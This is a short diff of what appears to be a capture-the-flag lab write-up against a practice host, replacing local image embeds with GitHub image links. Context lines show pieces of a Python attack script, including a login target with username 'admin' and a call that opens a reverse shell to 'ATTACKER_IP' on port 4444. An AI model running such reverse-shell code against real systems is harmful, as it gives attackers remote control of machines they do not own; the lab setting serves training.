@@ -41,7 +41,8 @@ import requests url = "http://python.thm/labs/lab1/index.php" username = "admin"
     
 ```
 
-![[Pasted image 20260622170533.png]]
+<img width="1919" height="836" alt="image" src="https://github.com/user-attachments/assets/e53ac3df-5bba-49e9-9f6d-365c929f7073" />
+
 
 
 **2nd flag try***
@@ -285,7 +286,8 @@ if session:
     get_reverse_shell(session, "ATTACKER_IP", 4444)
 ```
 
-![[Pasted image 20260622173807.png]]
+<img width="1919" height="769" alt="image" src="https://github.com/user-attachments/assets/1b7a8021-1607-4b66-b939-2d4f697bef52" />
+
 
 
 
